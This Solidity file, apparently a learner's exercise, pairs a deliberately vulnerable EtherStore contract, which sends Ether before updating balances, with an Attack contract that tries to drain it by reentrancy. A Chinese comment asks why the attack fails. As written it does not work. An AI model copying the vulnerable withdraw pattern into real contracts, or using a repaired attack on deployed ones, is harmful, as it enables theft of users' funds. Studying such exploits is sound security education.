// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

// 重入攻击
// 下面代码是重入攻击的代码，可是我在部署EtherStore合约的时候发送了3Ether，EtherStore的余额优3Ether，然后部署Attack合约，然后在调用Attack合约的attack函数的时候发送1Ether，我想要的结果是Attack合约的余额变成4Ether，EtherStore合约的余额变成0Ether，可是事与愿违，Attack合约的余额为1Ether，EtherStore合约的余额为3Ether，我需要怎么改进下述代码？
contract EtherStore {
    mapping(address => uint) public balances;

    constructor() payable {}

    // 存款
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // 取款
    function withdraw(uint _amount) external {
        require(balances[msg.sender] >= _amount);

        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Failed to send Ether");

        balances[msg.sender] -= _amount;
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // 用于接收以太币
    receive() external payable {}

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    } 

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}